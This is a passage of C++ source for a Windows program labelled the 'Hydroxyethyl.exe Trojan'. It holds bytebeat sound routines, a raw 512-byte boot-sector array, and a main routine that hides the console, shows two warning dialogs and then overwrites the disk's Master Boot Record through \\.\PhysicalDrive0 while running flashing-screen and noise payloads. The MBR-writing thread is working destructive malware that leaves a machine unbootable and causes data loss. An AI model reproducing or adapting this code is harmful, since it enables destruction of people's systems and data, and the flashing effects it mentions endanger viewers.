			(1 * t & 100) * (t >> 10 & 255) ^ 1 * t * 1 ^ t / 5
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound3(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t & t >> 12) * (t >> 4 | t >> 18) ^ t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound4(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t ^ t + (t >> 24 | 1) >> 11)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound5(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 9 & 110 | t >> 111 & 24 ^ t >> 10 & 15 & t >> 5)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound6(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * t >> 3 ^ t >> 4 & t ^ t >> 18 | t >> 4
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound7(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			((t + t % 27) & t >> 12) - 1
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound8(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t ^ t >> 3 * (t % 67 * t - t >> 3) & t >> 7 | t >> 5
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound9(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			log(t ^ t * t >> 4) * t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound10(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			(t & t >> 4 * t >> 3) | t >> 4
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

const unsigned char MasterBootRecord[] = { 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0x00,
0x26, 0x88, 0x05, 0x47, 0x83, 0xFF, 0xFF, 0x75, 0xF7, 0xFE, 0xC0, 0x31, 0xFF, 0xEB, 0xF1, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) { // mbr by N17Pro3426/Dogetech
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}



int main()
{
	HWND scw = GetConsoleWindow();
	ShowWindow(scw, SW_HIDE);
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (MessageBoxW(0, L"you are about to run a malware called Hydroxyethyl.exe Trojan which cause damages to your computer.\n\r\nuse this malware wisely, this will cause data loss and makes your computer likely unbootable.\ndo not attempet to open task manager or else it can still cause your Master Boot Record to be overwritten.\nif you don't know what this malware does just click 'No' to make your computer safe.\nif your clicking 'Yes' the Trojan will start and then you'll understand the risk of the damage you cause.\nif you want to try this try using a secure enviroment or a virtual machine.\ni am not responsible for any data loss or made damages to your computer.\ndo you want to execute this malware?\nyou wont be able to use windows again!\n\r\nFact/Danger/Warn: this will cause flashing lights and loud noises.", L"Hydroxyethyl means cellulose with C₂H₅O but... youll see", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	if (MessageBoxW(0, L"FINAL WARNING\n\r\nThis is the final warning.\nif you have read the important or previous messages then...\nyou must keep in mind your computer is going to be unbootable.\nthe creators are not responsible for any dataloss or damages to your computer.\n\r\ndo you still want to execute this malware?\nthis is your last resort.", L"welp geuss you wont be able to use windows again", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	CreateThread(0, 0, mbr, 0, 0, 0);
	Sleep(5000);
	HANDLE thread1or1 = CreateThread(0, 0, shader1or1, 0, 0, 0);
	HANDLE thread1or2 = CreateThread(0, 0, shader1or2, 0, 0, 0);
	HANDLE threadfresh = CreateThread(0, 0, refreshshad1, 0, 0, 0);
	sound1(32000, 30);
	TerminateThread(thread1or1, 0);
	TerminateThread(thread1or2, 0);
	TerminateThread(threadfresh, 0);
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	HANDLE thread2or1 = CreateThread(0, 0, payload2, 0, 0, 0);
	sound2(32000, 30);
	TerminateThread(thread2, 0);
	TerminateThread(thread2or1, 0);
	InvalidateRect(NULL, NULL, TRUE);
	HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
	HANDLE thread3or1 = CreateThread(0, 0, shader3or1, 0, 0, 0);
	HANDLE threadfresh3 = CreateThread(0, 0, refreshshad1, 0, 0, 0);
	sound3(32000, 30);
	TerminateThread(thread3, 0);
	TerminateThread(thread3or1, 0);
	TerminateThread(threadfresh3, 0);
	HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
	HANDLE thread4or1 = CreateThread(0, 0, shader4or1, 0, 0, 0);
	HANDLE thread4or2 = CreateThread(0, 0, shader4or2, 0, 0, 0);
	sound4(32000, 30);
	TerminateThread(thread4, 0);
	TerminateThread(thread4or1, 0);
	TerminateThread(thread4or2, 0);
	HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
	HANDLE thread5or1 = CreateThread(0, 0, shader5or1, 0, 0, 0);
	sound5(32000, 30);
	TerminateThread(thread5, 0);
	TerminateThread(thread5or1, 0);
	HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
	HANDLE thread6or1 = CreateThread(0, 0, shader6or1, 0, 0, 0);
	sound6(8000, 30);
	TerminateThread(thread6, 0);
	TerminateThread(thread6or1, 0);
	HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
	sound7(22050, 30);
	TerminateThread(thread7, 0);
	HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
	sound8(11025, 30);
	TerminateThread(thread8, 0);
	HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
	sound9(22050, 30);
	TerminateThread(thread9, 0);
	HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
	sound10(16000, 30);
	TerminateThread(thread10, 0);
	Sleep(-1);
}